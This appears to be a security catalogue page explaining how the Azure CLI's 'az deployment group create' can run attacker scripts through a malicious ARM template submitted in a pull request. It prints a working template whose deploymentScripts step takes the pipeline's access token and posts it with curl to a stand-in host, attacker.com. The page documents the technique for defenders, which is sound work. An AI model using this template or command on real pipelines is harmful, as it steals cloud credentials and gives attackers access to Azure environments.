---
layout: tool
title: az
parent: Living Off The Pipeline
nav_order: 28
---

## Living Off The Pipeline - az (Azure CLI)

The Azure CLI (`az`) is the command-line tool for managing Azure resources. It can be abused as a "Living Off The Pipeline" (LOTP) tool when sub-commands like `az deployment group create` are used to process malicious, repository-local template files.

### First-Order LOTP Tool

`az` is a **First-Order LOTP Tool**. It provides Remote Code Execution (RCE) by processing a malicious Azure Resource Manager (ARM) template that contains an executable script.

#### Malicious Primitive: Remote Code Execution (RCE)

The `az deployment group create` command is used to deploy Azure resources from an ARM template file (e.g., `main.json`). The ARM template specification includes a resource type called `Microsoft.Resources/deploymentScripts`. This resource is designed to run arbitrary PowerShell or Bash scripts as part of a deployment.

An attacker can add a malicious `deploymentScripts` resource to an ARM template in their pull request. When a CI/CD pipeline runs `az deployment group create` on this file, the Azure platform will execute the attacker's script. While the RCE occurs on a temporary Azure container and not the CI runner itself, it executes with the pipeline's cloud identity, giving the attacker a powerful foothold in the target Azure environment.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request with a malicious ARM template file.
    ```json
    {
      "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
      "contentVersion": "1.0.0.0",
      "resources": [
        {
          "type": "Microsoft.Resources/deploymentScripts",
          "apiVersion": "2020-10-01",
          "name": "pwnedDeploymentScript",
          "location": "[resourceGroup().location]",
          "kind": "AzureCLI",
          "properties": {
            "azCliVersion": "2.30.0",
            "scriptContent": "az account get-access-token --query accessToken -o tsv | curl -X POST -d @- http://attacker.com/",
            "retentionInterval": "PT1H"
          }
        }
      ]
    }
    ```

2.  **Vulnerable Workflow:** The pipeline contains a standard command to deploy the ARM template.
    ```yaml
    - name: Deploy to Azure
      run: az deployment group create --resource-group my-rg --template-file main.json
    ```

3.  **Execution:**
    *   The `az deployment group create` command is executed.
    *   It sends the attacker's malicious template to the Azure Resource Manager.
    *   Azure creates a temporary container to run the `deploymentScript`.
    *   The attacker's `scriptContent` is executed, which gets the access token of the pipeline's service principal and exfiltrates it to the attacker's server.

This attack is dangerous because the CI/CD workflow file contains a legitimate command. The malicious payload is hidden within a declarative infrastructure file.

### References

*   [Azure Docs: `deploymentScripts`](https://docs.microsoft.com/en-us/azure/templates/microsoft.resources/deploymentscripts)
